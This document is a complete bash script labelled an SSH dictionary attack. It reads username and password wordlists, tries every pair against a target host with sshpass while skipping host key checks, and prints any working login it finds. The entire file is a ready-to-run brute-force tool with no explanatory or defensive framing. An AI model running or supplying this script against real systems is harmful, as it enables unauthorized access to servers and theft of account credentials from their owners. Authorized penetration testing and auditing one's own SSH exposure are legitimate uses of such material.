#!/bin/bash

TIMEOUT="5"
PORT="22"

HOST=${1}
user_file=${2}
pass_file=${3}

declare -a user_list
declare -a pass_list

usernames() {
    local count=0
    while IFS= read -r user; do
        user_list[$count]="${user}"
        (( count++ ))
    done < "${user_file}"
}

passwords() {
    local count=0
    while IFS= read -r pass; do
        pass_list[$count]="${pass}"
        (( count++ ))
    done < "${pass_file}"
}

ssh_function() {
    local user="${1}"
    local pass="${2}"
    sshpass -p "${pass}" ssh \
        -o "ConnectTimeout=${TIMEOUT}" \
        -o "StrictHostKeyChecking=no" \
        -p "${PORT}" "${user}@${HOST}" \
        exit >/dev/null 2>&1
}

main() {
    local attempts=0

    for user in ${user_list[@]}; do
        echo
        echo -e "\t[*] Attempting Username: '${user}'"

        for pass in ${pass_list[@]}; do
            echo -e "\t[${attempts}] Attempting Password: '${pass}'"

            if ssh_function "${user}" "${pass}"; then
                echo -e "\t[+] Successful login!"
                echo -e "\t[+] Host: ${HOST}"
                echo -e "\t[+] Username: '${user}'"
                echo -e "\t[+] Password: '${pass}'"
                exit 0
            fi

            ((attempts++))
        done

    done

    echo -e "\n\tNo valid credentionals found."
}

echo -e "\n\tSSH Dictionary Attack Script Starting.\n"
usernames
passwords
main
echo -e "\n\tSSH Dictionary Attack Script Complete.\n"
